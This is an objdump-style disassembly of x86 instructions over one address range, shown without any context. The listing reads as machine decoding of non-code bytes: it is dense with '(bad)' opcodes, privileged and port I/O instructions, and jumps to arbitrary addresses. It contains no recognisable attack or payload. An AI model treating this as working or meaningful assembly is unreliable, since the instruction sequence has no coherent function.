  41c8f8:	xchg   DWORD PTR ds:0x6177a941,edx
  41c8fe:	daa    
  41c8ff:	sub    ecx,DWORD PTR [eax+0x58]
  41c902:	mov    ebx,0x1cc6d97c
  41c907:	pop    ecx
  41c908:	adc    BYTE PTR ds:0x29ec538d,dh
  41c90e:	leave  
  41c90f:	pop    ss
  41c910:	jg     0x41c932
  41c912:	mov    ebp,0x8c5b76a2
  41c917:	into   
  41c918:	fmul   DWORD PTR [eax+eiz*1+0x479e8bc3]
  41c91f:	cmp    al,dh
  41c921:	int3   
  41c922:	dec    edx
  41c923:	inc    BYTE PTR [ebx-0x1d06465f]
  41c929:	cmp    BYTE PTR [ecx+0x44],ah
  41c92c:	add    DWORD PTR [edi+0x7136cb83],0x46
  41c933:	mov    esp,0xa0bafb54
  41c938:	lea    ebp,[ebp-0x17]
  41c93b:	test   eax,0x3c601e4d
  41c940:	add    ebp,DWORD PTR ds:0x26fad513
  41c946:	add    DWORD PTR [edx],edx
  41c948:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c949:	push   ss
  41c94a:	sbb    eax,0x42b77a96
  41c94f:	sub    DWORD PTR [edx+eax*1-0x21],edx
  41c953:	cmp    al,0xdf
  41c955:	mov    dh,0x67
  41c957:	jne    0x41c950
  41c959:	cmp    bl,BYTE PTR [esi+0x5764212c]
  41c95f:	mov    esi,0x5ee44832
  41c964:	dec    edi
  41c965:	or     eax,0xf9f653ee
  41c96a:	leave  
  41c96b:	sub    BYTE PTR [edi+0x38565f13],bl
  41c971:	mov    esp,0x44a028f6
  41c976:	arpl   WORD PTR [ebp+0x7b2c02d0],sp
  41c97c:	gs into 
  41c97e:	out    0x8a,eax
  41c980:	mov    ds:0x61d8d4d,al
  41c985:	dec    edx
  41c986:	mov    dl,0x5a
  41c988:	inc    ecx
  41c989:	cmp    ah,BYTE PTR [ebx+0x258b2876]
  41c98f:	dec    ecx
  41c990:	lods   al,BYTE PTR ds:[esi]
  41c991:	loope  0x41c9da
  41c993:	mov    bl,0xe8
  41c995:	clc    
  41c996:	dec    esi
  41c997:	sbb    ch,BYTE PTR [edi+0x7939af29]
  41c99d:	clc    
  41c99e:	push   ecx
  41c99f:	jo     0x41c9c0
  41c9a1:	gs jno 0x41c9d2
  41c9a4:	cs loopne 0x41c9ed
  41c9a7:	xor    DWORD PTR [edi],ebx
  41c9a9:	pop    ss
  41c9aa:	push   ecx
  41c9ab:	pushf  
  41c9ac:	push   ecx
  41c9ad:	cli    
  41c9ae:	push   edx
  41c9af:	stos   BYTE PTR es:[edi],al
  41c9b0:	add    bl,BYTE PTR [edi]
  41c9b2:	pop    edi
  41c9b3:	in     al,0x65
  41c9b5:	dec    DWORD PTR [eax-0x4d]
  41c9b8:	jecxz  0x41c9b3
  41c9ba:	and    dl,BYTE PTR [eax-0x57eb3782]
  41c9c0:	or     al,0x78
  41c9c2:	push   ebx
  41c9c3:	shl    DWORD PTR [edi-0x28],0x41
  41c9c7:	inc    edi
  41c9c8:	in     al,dx
  41c9c9:	adc    al,dl
  41c9cb:	fmul   st,st(7)
  41c9cd:	mov    esp,0xcb6f46ab
  41c9d2:	pop    ss
  41c9d3:	(bad)  
  41c9d4:	iret   
  41c9d5:	xchg   esp,eax
  41c9d6:	pop    edx
  41c9d7:	loope  0x41c9d5
  41c9d9:	dec    edx
  41c9da:	cmp    al,0x10
  41c9dc:	xchg   esi,eax
  41c9dd:	xchg   edi,eax
  41c9de:	iret   
  41c9df:	pop    ecx
  41c9e0:	adc    esp,0xfffffffb
  41c9e3:	jmp    0x41c996
  41c9e5:	enter  0x6461,0x10
  41c9e9:	mov    cx,0x9a1d
  41c9ed:	rsm    
  41c9ef:	add    eax,edx
  41c9f1:	add    al,BYTE PTR [edi+0x35]
  41c9f4:	cld    
  41c9f5:	retf   0x5796
  41c9f8:	xchg   esp,eax
  41c9f9:	popa   
  41c9fa:	jmp    0x41c9af
  41c9fc:	in     al,dx
  41c9fd:	push   ds
  41c9fe:	in     eax,dx
  41c9ff:	(bad)  
  41ca00:	mov    WORD PTR [esi+0x64],cs
  41ca03:	fs cwde 
  41ca05:	add    al,0x9b
  41ca07:	shl    BYTE PTR [ecx-0x1e],0xbb
  41ca0b:	sub    DWORD PTR [eax],esp
  41ca0d:	push   ebp
  41ca0e:	lods   eax,DWORD PTR fs:[esi]
  41ca10:	xchg   ecx,eax
  41ca11:	push   0xffffffe5
  41ca13:	push   ecx
  41ca14:	xor    ebx,DWORD PTR [edi-0x7f]
  41ca17:	adc    ebp,ecx
  41ca19:	jmp    0x41ca2a
  41ca1b:	stc    
  41ca1c:	mov    WORD PTR [edx-0x42],gs
  41ca1f:	mov    al,0x43
  41ca21:	jno    0x41ca40
  41ca23:	pop    es
  41ca24:	fist   DWORD PTR [ebx]
  41ca26:	mov    ebp,0x61b15108
  41ca2b:	sahf   
  41ca2c:	pop    edx
  41ca2d:	(bad)
  41ca31:	jmp    0x41ca43
  41ca33:	pop    esi
  41ca34:	dec    ebx
  41ca35:	xchg   edx,eax
  41ca36:	mov    esp,0x1c1df4af
  41ca3b:	xor    BYTE PTR [ebx-0x8],0xae
  41ca3f:	dec    edi
  41ca40:	out    dx,eax
  41ca41:	mov    ds:0x8420191a,eax
  41ca46:	ins    DWORD PTR es:[edi],dx
  41ca47:	jmp    0xa91c:0xbdfc54
  41ca4e:	ret    
  41ca4f:	cmp    edx,DWORD PTR [ebx-0x1951f0a8]
  41ca55:	xor    al,0x49
  41ca57:	fiadd  DWORD PTR [edx-0x277b137]
  41ca5d:	inc    esp
  41ca5e:	aam    0xd9
  41ca60:	(bad)
  41ca65:	adc    eax,0xfbe3e9a0
  41ca6a:	or     dh,BYTE PTR [eax-0x174d1ced]
  41ca70:	and    al,0xa1
  41ca72:	test   eax,0xb3d8ebb8
  41ca77:	dec    esp
  41ca78:	(bad)  
  41ca7a:	mov    ebx,0xfb9f5cb1
  41ca7f:	cdq    
  41ca80:	add    al,0x1c
  41ca82:	shl    BYTE PTR [edi+eax*2+0x6a],0xa7
  41ca87:	cmp    al,BYTE PTR [esi-0x2b]
  41ca8a:	sbb    eax,0x8a7b50f
  41ca8f:	sub    ch,dh
  41ca91:	ror    ch,1
  41ca93:	inc    esp
  41ca94:	inc    eax
  41ca95:	and    cl,0x8c
  41ca98:	hlt    
  41ca99:	clc    
  41ca9a:	gs xchg ebx,eax
  41ca9c:	jnp    0x41caac
  41ca9e:	xor    DWORD PTR [ebp+edx*4+0x539740d5],esp
  41caa5:	adc    DWORD PTR [ecx-0xc13127],0x48
  41caac:	stc    
  41caad:	(bad)  
  41caae:	loopne 0x41cac9
  41cab0:	inc    ecx
  41cab1:	xor    DWORD PTR [ebx+0x3be3d4a8],esi
  41cab7:	xchg   ebx,eax
  41cab8:	inc    edi
  41cab9:	out    dx,eax
  41caba:	push   edx
  41cabb:	pop    edi
  41cabc:	(bad)  
  41cabd:	ins    BYTE PTR es:[edi],dx
  41cabe:	nop
  41cabf:	(bad)  
  41cac1:	sbb    bl,BYTE PTR [ebp+0x53]
  41cac4:	or     BYTE PTR [eax-0x684ba8e5],0xaa
  41cacb:	add    eax,0xfd2374f5
  41cad0:	dec    ebp
  41cad1:	add    eax,0x4014a043
  41cad6:	icebp  
  41cad7:	xor    al,0xf3
  41cad9:	das    
  41cada:	aas    
  41cadb:	sbb    ecx,DWORD PTR [esi]
  41cadd:	lahf   
  41cade:	xor    al,0x64
  41cae1:	std    
  41cae2:	cmp    al,0xe7
  41cae4:	xchg   ebp,eax
  41cae5:	clc    
  41cae6:	fist   WORD PTR [ebx]
  41cae8:	push   0x50ea3a74
  41caed:	loop   0x41cacb
  41caef:	mov    eax,ebx
  41caf1:	sbb    bl,BYTE PTR [edx+0x382b803b]
  41caf7:	ins    DWORD PTR es:[edi],dx
  41caf8:	call   0x612e7b76
  41cafd:	stos   BYTE PTR es:[edi],al
  41cafe:	fild   WORD PTR [eax+0x29]
  41cb01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb02:	leave  
  41cb03:	jne    0x41cae4
  41cb05:	loopne 0x41cb33
  41cb07:	sbb    DWORD PTR [ecx],0xd9aa1659
  41cb0d:	mov    bh,dl
  41cb0f:	lock xor BYTE PTR [esp+ebx*4-0x73],al
  41cb14:	adc    eax,0x453995d7
  41cb19:	jae    0x41caf1
  41cb1b:	je     0x41cac7
  41cb1d:	imul   esp,esp,0x7c99b764
  41cb23:	pop    ebx
  41cb24:	sbb    ebp,DWORD PTR [ebp+0x60]
  41cb27:	pop    ebp
  41cb28:	mov    eax,ds:0x712375a2
  41cb2d:	mov    al,al
  41cb2f:	sbb    eax,ecx
  41cb31:	pusha  
  41cb32:	sahf   
  41cb33:	rcr    DWORD PTR [esi+esi*1+0x5],cl
  41cb37:	push   ecx
  41cb38:	loop   0x41caef
  41cb3a:	shr    BYTE PTR [eax],1
  41cb3c:	xchg   DWORD PTR [ebx],eax
  41cb3e:	in     eax,0xa3
  41cb40:	cwde   
  41cb41:	stc    
  41cb42:	ss dec ecx
  41cb44:	mov    cl,0x96
  41cb46:	inc    DWORD PTR [edx]
  41cb48:	jae    0x41cb98
  41cb4a:	sub    BYTE PTR [edi+ecx*1],0x55
  41cb4e:	sub    edx,DWORD PTR ds:[ebx]
  41cb51:	stos   DWORD PTR es:[edi],eax
  41cb52:	dec    esi
  41cb53:	imul   DWORD PTR [eax-0x34]
  41cb56:	jmp    0xb599a6df
  41cb5b:	dec    eax
  41cb5c:	je     0x41cb21
  41cb5e:	repnz mov dl,0x14
  41cb61:	js     0x41cbdd
  41cb63:	lahf   
  41cb64:	add    bl,bl
  41cb66:	push   0xff41055
  41cb6b:	and    al,0x9e
  41cb6d:	into   
  41cb6e:	xlat   BYTE PTR ds:[ebx]
  41cb6f:	add    eax,0xdd4f5d48
  41cb74:	test   eax,0xed2a8cfc
  41cb79:	mov    ah,0x89
  41cb7b:	neg    DWORD PTR [ebx+eax*1+0x7f]
  41cb7f:	outs   dx,DWORD PTR ds:[esi]
  41cb80:	dec    eax
  41cb81:	aaa    
  41cb82:	repz int3 
  41cb84:	push   ds
  41cb85:	xchg   DWORD PTR [esi+0x5892f83],eax
  41cb8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb8c:	xor    ah,cl
  41cb8e:	inc    edi
  41cb8f:	inc    esp
  41cb90:	mov    dl,0x27
  41cb92:	dec    edi
  41cb93:	mov    ecx,0x8d8d58cd
  41cb98:	jb     0x41cb69
  41cb9a:	xchg   ecx,eax
  41cb9b:	or     BYTE PTR [ebx],ch
  41cb9d:	adc    ch,dl
  41cb9f:	add    DWORD PTR [eax],0x119a13d0
  41cba5:	inc    ecx
  41cba6:	in     al,dx
  41cba7:	into   
  41cba8:	les    edx,FWORD PTR [ebp+0x7290ac3]
  41cbae:	mov    dl,0xce
  41cbb0:	test   BYTE PTR [edx+0x115219ae],al
  41cbb6:	mov    edi,ecx
  41cbb8:	mov    ?,WORD PTR ds:0x94412065
  41cbbe:	or     al,0x6f
  41cbc0:	jle    0x41cb87
  41cbc2:	dec    ebp
  41cbc3:	pop    edi
  41cbc4:	xchg   ebx,eax
  41cbc5:	fnstcw WORD PTR [ecx-0x15cacaec]
  41cbcb:	push   es
  41cbcc:	xchg   ecx,eax
  41cbcd:	or     ebp,DWORD PTR [edx]
  41cbcf:	jno    0xb502dee3
  41cbd5:	lock adc BYTE PTR [ebx+0x58],bl
  41cbd9:	add    ebp,ecx
  41cbdb:	in     al,0x48
  41cbdd:	(bad)  
  41cbde:	call   0xbe521e4
  41cbe3:	mov    ebp,0x6c566415
  41cbe8:	cwde   
  41cbe9:	int    0x2b
  41cbeb:	mov    ecx,0x31635096
  41cbf0:	scas   al,BYTE PTR es:[edi]
  41cbf1:	shl    DWORD PTR [ecx+0x719cc7c6],cl
  41cbf7:	xchg   esp,eax
  41cbf8:	pop    edx
  41cbf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbfa:	or     DWORD PTR [edx+0x61],0x5d35c4e
  41cc01:	sahf   
  41cc02:	xchg   esi,eax
  41cc03:	pushf  
  41cc04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc05:	ror    DWORD PTR [ebx],cl
  41cc07:	or     BYTE PTR [ebx],al
  41cc09:	scas   al,BYTE PTR es:[edi]
  41cc0a:	mov    eax,0xa29b2889
  41cc0f:	in     al,0xdb
  41cc11:	mov    ds:0x98966a35,al
  41cc16:	pop    esp
  41cc17:	xlat   BYTE PTR ds:[ebx]
  41cc18:	jbe    0x41cc28
  41cc1a:	test   DWORD PTR [edx],esi
  41cc1c:	jmp    0x41cc0c
  41cc1e:	adc    al,BYTE PTR [edx-0x5b]
  41cc21:	stc    
  41cc22:	inc    ecx
  41cc23:	out    0xb1,eax
  41cc25:	mov    ecx,0x92394709
  41cc2a:	dec    esp
  41cc2b:	mov    ds:0xc9493211,eax
  41cc30:	retf   
  41cc31:	stos   BYTE PTR es:[edi],al
  41cc32:	or     al,0xda
  41cc34:	arpl   WORD PTR [ebp-0x7d],ax
  41cc37:	test   DWORD PTR [ecx+0x76],eax
  41cc3a:	pop    esi
  41cc3b:	inc    esi
  41cc3c:	and    bl,bl
  41cc3e:	test   BYTE PTR [edi],cl
  41cc40:	cmp    DWORD PTR [edi+0x10596ab5],0xd34d14f9
  41cc4a:	adc    edx,DWORD PTR [esi]
  41cc4c:	and    BYTE PTR [ebx-0x33b33ea1],0x89
  41cc53:	out    0x2d,al
  41cc55:	adc    eax,0xd5dc6b54
  41cc5a:	lods   al,BYTE PTR ds:[esi]
  41cc5b:	punpckhdq mm7,QWORD PTR ds:0xabb40379
  41cc62:	fist   DWORD PTR [ecx-0x2d]
  41cc65:	lock iret 
  41cc67:	add    esp,DWORD PTR [eax-0x24]
  41cc6a:	xor    eax,0x1c445b6c
  41cc6f:	call   0x6224:0xe3fd20c8
  41cc76:	adc    al,0xa0
  41cc78:	sbb    al,0x37
  41cc7a:	rol    DWORD PTR [ebx-0x298d8e2f],1
  41cc80:	dec    ebp
  41cc81:	xor    BYTE PTR [ebx-0x46b8ef93],bl
  41cc87:	mov    eax,ds:0x6860da30
  41cc8c:	(bad)  
  41cc8d:	xor    DWORD PTR [eax],ecx
  41cc8f:	stos   DWORD PTR es:[edi],eax
  41cc90:	dec    ebp
  41cc91:	push   es
  41cc92:	ds in  al,dx
  41cc94:	push   cs
  41cc95:	rdmsr  
  41cc97:	adc    al,0x17
  41cc99:	out    dx,eax
  41cc9a:	xlat   BYTE PTR ds:[ebx]
  41cc9b:	push   ecx
  41cc9c:	loop   0x41cc80
  41cc9e:	mov    dh,0x7d
  41cca0:	out    0x5e,al
  41cca2:	mov    ah,0x56
  41cca4:	(bad)  
  41cca5:	adc    ch,bh
  41cca7:	dec    eax
  41cca8:	add    al,0x32
  41ccaa:	mov    WORD PTR [esp+edx*8],cs
  41ccad:	dec    eax
  41ccae:	fistp  DWORD PTR [ecx]
  41ccb0:	iret   
  41ccb1:	mov    bh,0xd9
  41ccb3:	mov    cl,0x78
  41ccb5:	mov    dl,0xb8
  41ccb7:	ja     0x41ccce
  41ccb9:	test   al,0xd4
  41ccbb:	jl     0x41cc82
  41ccbd:	ret    
  41ccbe:	enter  0xf32f,0xe7
  41ccc2:	mov    eax,ds:0x4417d44c
  41ccc7:	out    0x54,al
  41ccc9:	dec    edi
  41ccca:	ja     0x41cc82
  41cccc:	(bad)  
  41ccce:	out    0x7c,eax
  41ccd0:	sbb    ah,al
  41ccd2:	test   DWORD PTR [ebx+0x76f8c57],esi
  41ccd8:	in     eax,dx
  41ccd9:	cdq    
  41ccda:	jp     0x41cd2e
  41ccdc:	jns    0x41ccaa
  41ccde:	and    ecx,DWORD PTR [ebp+0x3a]
  41cce1:	dec    esp
  41cce2:	push   es
  41cce3:	xchg   edx,eax
  41cce4:	inc    eax
  41cce5:	add    eax,0xa94091f4
  41ccea:	(bad)  
  41ccec:	cli    
  41cced:	xor    bl,ah
  41ccef:	pop    edx
  41ccf0:	test   DWORD PTR ds:[esi+edx*1+0x2f],0xb5bd7833
  41ccf9:	aam    0xda
  41ccfb:	fidiv  WORD PTR [ebx]
  41ccfd:	mov    eax,ds:0x3120afab
  41cd02:	pop    DWORD PTR [bp+0x6f15]
  41cd07:	loope  0x41cd79
  41cd09:	jns    0x41ccad
  41cd0b:	push   eax
  41cd0c:	je     0x41ccb3
  41cd0e:	mov    eax,0x7f3d2f5d
  41cd13:	shr    BYTE PTR [esi-0x4],0x84
  41cd17:	aad    0x6e
  41cd19:	arpl   WORD PTR [ecx+eax*1+0x73],sp
  41cd1d:	scas   al,BYTE PTR es:[edi]
  41cd1e:	adc    DWORD PTR [esi-0x5b309a0d],esp
  41cd24:	pop    esi
  41cd25:	xchg   esp,eax
  41cd26:	add    esi,esp
  41cd28:	arpl   WORD PTR [ebx-0x31ee2ab1],cx
  41cd2e:	pop    ebx
  41cd2f:	pop    ds
  41cd30:	xchg   DWORD PTR [ebx-0x42e2c287],edx
  41cd36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd37:	test   al,0xd0
  41cd39:	fsubr  st,st(6)
  41cd3b:	mov    esp,0x83e8c7a
  41cd40:	test   eax,0x4347c697
  41cd45:	fisttp QWORD PTR [edi-0x587ada9c]
  41cd4b:	mov    dl,0xa5
  41cd4d:	inc    esi
  41cd4e:	pushf  
  41cd4f:	mov    BYTE PTR [ebx+ecx*2-0x7b],cl
  41cd53:	outs   dx,DWORD PTR ds:[esi]
  41cd54:	data16 or al,0x25
  41cd57:	test   dh,bh
  41cd59:	jnp    0x41cdbb
  41cd5b:	das    
  41cd5c:	pop    ebp
  41cd5d:	add    BYTE PTR [ecx-0x63],ah
  41cd60:	push   ss
  41cd61:	adc    al,0xc
  41cd63:	adc    al,0x47
  41cd65:	add    ch,bl
  41cd67:	rcr    al,cl
  41cd69:	call   0x590d:0x845a43b2
  41cd70:	iret   
  41cd71:	imul   ebx,eax,0xffffffe0
  41cd74:	rcl    ecx,0x1d
  41cd77:	ret    0x3156
  41cd7a:	ins    DWORD PTR es:[edi],dx
  41cd7b:	mov    dh,0x96
  41cd7d:	jge    0x41cd16
  41cd7f:	fisub  DWORD PTR [esi+0x7e]
  41cd82:	mov    ah,0xd5
  41cd84:	hlt    
  41cd85:	push   edx
  41cd86:	or     eax,0xe95f1689
  41cd8b:	add    dl,BYTE PTR [eax]
  41cd8d:	mov    cl,0xb0
  41cd8f:	(bad)  
  41cd90:	out    0xdb,eax
  41cd92:	push   cs
  41cd93:	stc    
  41cd94:	push   es
  41cd95:	hlt    
  41cd96:	mov    WORD PTR [esi+0x15ba155c],?
  41cd9c:	aad    0x6f
  41cd9e:	pop    edx
  41cd9f:	jae    0x41cdd7
  41cda1:	xchg   esp,eax
  41cda2:	pop    esi
  41cda3:	adc    al,0x5c
  41cda5:	mov    esp,0xe02d1986
  41cdaa:	jnp    0x41ce1c
  41cdac:	ss in  eax,dx
  41cdae:	or     DWORD PTR [edx+0x7c87a437],0xffffffe8
  41cdb5:	fcos   
  41cdb7:	pop    eax
  41cdb8:	pop    ebx
  41cdb9:	cmp    cl,al
  41cdbb:	(bad)  
  41cdbc:	mov    ebp,DWORD PTR [ecx+ecx*8+0x21a9603c]
  41cdc3:	popf   
  41cdc4:	ins    BYTE PTR es:[edi],dx
  41cdc5:	scas   eax,DWORD PTR es:[edi]
  41cdc6:	aas    
  41cdc7:	ss push ss
  41cdc9:	into   
  41cdca:	sub    al,0x36
  41cdcd:	dec    eax
  41cdce:	(bad)  
  41cdcf:	cmp    ecx,ebx
  41cdd1:	ficomp WORD PTR [edi+0x72]
  41cdd4:	scas   eax,DWORD PTR es:[edi]
  41cdd5:	xchg   ebp,eax
  41cdd6:	popf   
  41cdd7:	sub    DWORD PTR ds:0x17d04e0d,ebx
  41cddd:	push   edx
  41cdde:	push   0x17322a5f
  41cde3:	mov    ebp,0x6f070bf8
  41cde8:	or     eax,0x295ee8a6
  41cded:	pop    ebx
  41cdee:	mov    ?,WORD PTR [edi-0x4e]
  41cdf1:	dec    ecx
  41cdf2:	ret    0x266e
  41cdf5:	and    dl,cl
  41cdf7:	sbb    bh,bh
  41cdf9:	push   eax
  41cdfa:	inc    edx
  41cdfb:	push   esi
  41cdfc:	push   es
  41cdfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdfe:	iret   
  41cdff:	push   esp
  41ce00:	xchg   DWORD PTR [eax+edi*1],eax
  41ce03:	sub    DWORD PTR [ebp-0x4c322afb],esi
  41ce09:	jge    0x41cd91
  41ce0b:	fmul   st(5),st
  41ce0d:	jecxz  0x41ce5a
  41ce0f:	clc    
  41ce10:	sub    bl,BYTE PTR [edi-0x10]
  41ce13:	dec    ebp
  41ce14:	into   
  41ce15:	or     DWORD PTR [edx+0x4a],esi
  41ce18:	jg     0x41ce11
  41ce1a:	mov    bl,0x1f
  41ce1d:	sbb    edi,ebp
  41ce1f:	jae    0x41ce4a
  41ce21:	fdiv   QWORD PTR [eax+eax*1-0x1b]
  41ce25:	iret   
  41ce26:	mov    ebx,0xf90c982
  41ce2b:	xchg   esp,eax
  41ce2c:	adc    ch,dh
  41ce2e:	cdq    
  41ce2f:	sub    eax,0x872d88b1
  41ce34:	in     eax,dx
  41ce35:	sbb    bh,BYTE PTR [ebp-0x1d41aaee]
  41ce3b:	repz inc esi
  41ce3d:	fstp   QWORD PTR [ebx]
  41ce3f:	out    0x18,eax
  41ce41:	mov    ebx,0xd57917da
  41ce46:	ror    esi,cl
  41ce48:	scas   al,BYTE PTR es:[edi]
  41ce49:	xlat   BYTE PTR ds:[ebx]
  41ce4a:	(bad)  
  41ce4b:	jle    0x41ce36
  41ce4d:	inc    ebp
  41ce4e:	cli    
  41ce4f:	sub    eax,0xa80fe155
  41ce54:	ret    
  41ce55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce56:	mul    edi
  41ce58:	mov    dl,0x19
  41ce5a:	in     al,dx
  41ce5b:	push   ecx
  41ce5c:	jb     0x41ce53
  41ce5e:	cwde   
  41ce5f:	(bad)
  41ce63:	cmp    esp,DWORD PTR [ecx-0xa7029b7]
  41ce69:	and    al,0xd1
  41ce6b:	iret   
  41ce6c:	sub    eax,0x91fca26d
  41ce71:	push   cs
  41ce72:	dec    ecx
  41ce73:	adc    al,0x2
  41ce75:	and    al,0xe3
  41ce77:	mov    eax,ds:0x332f88a5
  41ce7c:	push   es
  41ce7d:	cmp    edx,ebx
  41ce7f:	dec    ebp
  41ce80:	in     eax,0x5a
  41ce82:	int3   
  41ce83:	cwde   
  41ce84:	push   edi
  41ce85:	shl    bh,0xd2
  41ce88:	add    al,0x31
  41ce8a:	push   0xe3e21cbc
  41ce8f:	cs adc dl,dl
  41ce92:	dec    ecx
  41ce93:	aam    0xa4
  41ce95:	(bad)  
  41ce96:	fsub   QWORD PTR [eax]
  41ce98:	mov    esp,0x14ee9214
  41ce9d:	adc    DWORD PTR [edi-0x3434160d],0xb3b43aa8
  41cea7:	add    ch,dl
  41cea9:	fucomp st(7)
  41ceab:	inc    edi
  41ceac:	jnp    0x41cf2c
  41ceae:	adc    ebx,DWORD PTR [eax+0x5e]
  41ceb1:	sbb    dl,bl
  41ceb3:	or     eax,0x8678b6d7
  41ceb8:	sbb    esp,DWORD PTR [edx]
  41ceba:	mov    esi,0xa46d3a66
  41cebf:	mov    al,ds:0xdfae1a0c
  41cec4:	mov    ebp,0x5e42ca6c
  41cec9:	(bad)  
  41ceca:	repnz test BYTE PTR [eax-0x7a],dl
  41cece:	call   0x570413d7
  41ced3:	fisub  WORD PTR [esi-0x68]
  41ced6:	xlat   BYTE PTR ds:[ebx]
  41ced7:	dec    edx
  41ced8:	inc    esp
  41ced9:	push   0xffffffa5
  41cedb:	das    
  41cedc:	daa    
  41cedd:	xlat   BYTE PTR ds:[ebx]
  41cede:	rol    DWORD PTR [ecx+ecx*4-0x14],cl
  41cee2:	mov    WORD PTR [esi],cs
  41cee4:	out    dx,eax
  41cee5:	mov    al,0xe8
  41cee7:	add    al,0xc1
  41cee9:	call   0x47b21587
  41ceee:	sbb    BYTE PTR ds:0xf699ee93,ch
  41cef4:	out    dx,al
  41cef5:	inc    eax
  41cef6:	xor    DWORD PTR [ecx+0x6d74724d],esi
  41cefc:	fadd   st(4),st
  41cefe:	adc    dh,ch
  41cf00:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf02:	cmp    ebx,DWORD PTR ds:0xa8b0e623
  41cf08:	xchg   ebx,eax
  41cf09:	dec    eax
  41cf0a:	sbb    al,0xc
  41cf0c:	xchg   edi,eax
  41cf0d:	add    al,0xa
  41cf0f:	(bad)  
  41cf10:	in     al,dx
  41cf11:	jg     0x41cf40
  41cf13:	add    dl,BYTE PTR [esi+ecx*8+0xd]
  41cf17:	retf   0x2e62
  41cf1a:	repz push ebx
  41cf1c:	dec    ebx
  41cf1d:	imul   eax,DWORD PTR [edx-0x4f],0xa
  41cf21:	imul   eax,eax,0xdd86f62d
  41cf27:	ret    0x97cb
  41cf2a:	retf   
  41cf2b:	gs push 0xffffffd1
  41cf2e:	fldl2t 
  41cf30:	xchg   esi,eax
  41cf31:	add    cl,BYTE PTR [eax+eiz*8]
  41cf34:	test   al,0xc2
  41cf36:	jp     0x41cf8a
  41cf38:	int    0x5c
  41cf3a:	dec    ebx
  41cf3b:	xchg   edx,eax
  41cf3c:	mov    BYTE PTR [ebx-0x7b],bl
  41cf3f:	outs   dx,BYTE PTR ds:[esi]
  41cf40:	add    BYTE PTR [ebx],bl
  41cf42:	pop    ds
  41cf43:	stos   BYTE PTR es:[edi],al
  41cf44:	repz cmp DWORD PTR ds:0x2d73f457,0x1d20e287
  41cf4f:	adc    al,BYTE PTR [eax+eax*8]
  41cf52:	ffree  st(6)
  41cf54:	scas   eax,DWORD PTR es:[edi]
  41cf55:	nop
  41cf56:	into   
  41cf57:	add    BYTE PTR [edx],0x60
  41cf5a:	pop    ebx
  41cf5b:	add    BYTE PTR [edi],dl
  41cf5d:	or     eax,0x631e8c1
  41cf62:	jbe    0x41cf6d
  41cf64:	sbb    eax,0xccdae441
  41cf69:	jmp    0x41cf27
  41cf6b:	jmp    0x41cf7b
  41cf6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf6e:	adc    BYTE PTR [esi],ah
  41cf70:	sub    al,bh
  41cf72:	ret    
  41cf73:	(bad)  
  41cf74:	pop    esp
  41cf75:	dec    edx
  41cf76:	fldenv [edx-0x52]
  41cf79:	mov    DWORD PTR [ecx-0x63b3d60f],edi
  41cf7f:	test   BYTE PTR [ebx+0x1d0421f4],0x12
  41cf86:	ficomp WORD PTR ds:0x355b3cf5
  41cf8c:	sub    eax,0xb73bb42a
  41cf91:	lahf   
  41cf92:	jno    0x41cf7c
  41cf94:	inc    esp
  41cf95:	pop    ebp
  41cf96:	xchg   esp,eax
  41cf97:	mov    edx,0x3f3c031a
  41cf9c:	push   edx
  41cf9d:	adc    edi,DWORD PTR [esi]
  41cf9f:	ins    BYTE PTR es:[edi],dx
  41cfa0:	push   0x14
  41cfa2:	pop    es
  41cfa3:	das    
  41cfa4:	inc    esi
  41cfa5:	icebp  
  41cfa6:	pop    eax
  41cfa7:	xchg   cl,bl
  41cfa9:	xchg   BYTE PTR [esp+ebp*8],bh
  41cfac:	jp     0x41cfe3
  41cfae:	ror    DWORD PTR [ecx+0x39c9ecc0],0xa2
  41cfb5:	jo     0x41d027
  41cfb7:	xchg   edi,eax
  41cfb8:	cs ins BYTE PTR es:[edi],dx
  41cfba:	or     DWORD PTR [ebx-0x48],ebp
  41cfbd:	mov    DWORD PTR [edx],esi
  41cfbf:	sub    dh,BYTE PTR ds:0xa513eadd
  41cfc5:	fisubr DWORD PTR [esi-0x37474cfd]
  41cfcb:	xchg   BYTE PTR [eax],ah
  41cfcd:	cdq    
  41cfce:	aad    0x1e
  41cfd0:	adc    eax,0x96030b9a
  41cfd5:	pop    ecx
  41cfd6:	int3   
  41cfd7:	test   DWORD PTR [eax],0xede0b9c9
  41cfdd:	retf   0x4f1b
  41cfe0:	aam    0xa2
  41cfe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfe3:	inc    esi
  41cfe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfe5:	push   cs
  41cfe6:	sub    BYTE PTR [edx],bh
  41cfe8:	pop    edi
  41cfe9:	fimul  WORD PTR [ebx+0x5529175f]
  41cfef:	call   0xff0b:0xae5bf2a6
  41cff6:	icebp  
  41cff7:	fbld   TBYTE PTR [ecx-0x4020f493]
  41cffd:	xchg   ebx,eax
  41cffe:	adc    BYTE PTR [ebx-0x5d30ca9b],dl
  41d004:	imul   esi,DWORD PTR [edi+0x4fc10185],0xffffff88
  41d00b:	and    cl,BYTE PTR [edi]
  41d00d:	mov    bh,0xf2
  41d00f:	mov    ch,0xa0
  41d011:	cdq    
  41d012:	adc    esi,DWORD PTR [edi]
  41d014:	xor    DWORD PTR [ecx],esi
  41d016:	mov    esi,0xf6a27fcb
  41d01b:	sub    DWORD PTR [esi+0x16],0xf88b75b
  41d022:	lds    ebp,FWORD PTR [esi+0x23a8069a]
  41d028:	test   al,0xa2
  41d02a:	and    DWORD PTR [ebx],ecx
  41d02c:	xchg   BYTE PTR [ebx+ebx*2],bh
  41d02f:	mov    cl,0xf4
  41d031:	pushf  
  41d032:	mov    al,0x84
  41d034:	and    ah,BYTE PTR [ecx+eax*4]
  41d037:	daa    
  41d038:	mov    bl,dh
  41d03a:	stos   DWORD PTR es:[edi],eax
  41d03b:	sub    ebx,ebp
